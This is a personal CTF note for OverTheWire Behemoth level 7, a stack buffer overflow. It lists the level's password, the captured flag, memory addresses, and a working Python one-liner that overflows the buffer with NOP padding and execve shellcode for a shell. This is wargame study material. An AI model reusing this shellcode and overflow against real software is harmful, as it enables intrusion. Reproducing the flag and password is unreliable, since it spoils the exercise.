---
tags:
  - ctf
  - "#behemoth_7"
  - "#buffer_overflow"
created: 2026-06-06
---

# `Level [7]` 
> Stack-based buffer overflow

## 🔐 Connection data

| Parameter | Value                         |
| --------- | ----------------------------- |
| Host      | behemoth.labs.overthewire.org |
| Port      | 2221                          |
| Login     | behemoth7                     |
| Password  | sV17oOQTKc                    |

## 🎯 Task of the level
- 
## 🎯 Information

| Type of information     | Data                               |
| ----------------------- | ---------------------------------- |
| possible vuln functions | strcpy<br>fprintf                  |
| program work            | get sting lenght in 0xffffd51f     |
| data in program         | 0xffffd51f = /bin/bash             |
| program work            | remove all env                     |
| buffer offset           | 532                                |
| buffer size             | 528                                |
| /bin/sh addr            | `0xf7f3ede8`<br>`\xe8\xed\xf3\xf7` |
| system addr             | `0xf7dd18e0`<br>`\xe0\x18\xdd\xf7` |
| addr to esp             | `0xffffd36c`<br>`\x6c\xd3\xff\xff` |

## 🎯 Tools

| Tool | Destination | Usage |
| ---- | ----------- | ----- |
|      |             |       |
## 📚 Key commands/technics

| Coomand | Desctiption |
| ------- | ----------- |
|         |             |
|         |             |
|         |             |

## 💡 Step by step

| Step | Action                             | Information                    |
| ---- | ---------------------------------- | ------------------------------ |
| 1    | find vuln function                 | #strcpy                        |
| 2    | find buffer size                   | 528                            |
| 3    | find buffer offset                 | 528+4                          |
| 4    | find ESP address fills with offset |                                |
| 5    | create payload to ESP address      | 528A+4address+200NOP+shellcode |

## 🔍 Result
Flag: 8yWcelJd0D

## 🚪 Travel
-> [Behemoth_7]

## 🔗 Link
- [Название ресурса](URL)
  
  `$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*528+b"\x6c\xd3\xff\xff"+b"\x90"*20+b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"+b"\x90"*20)')`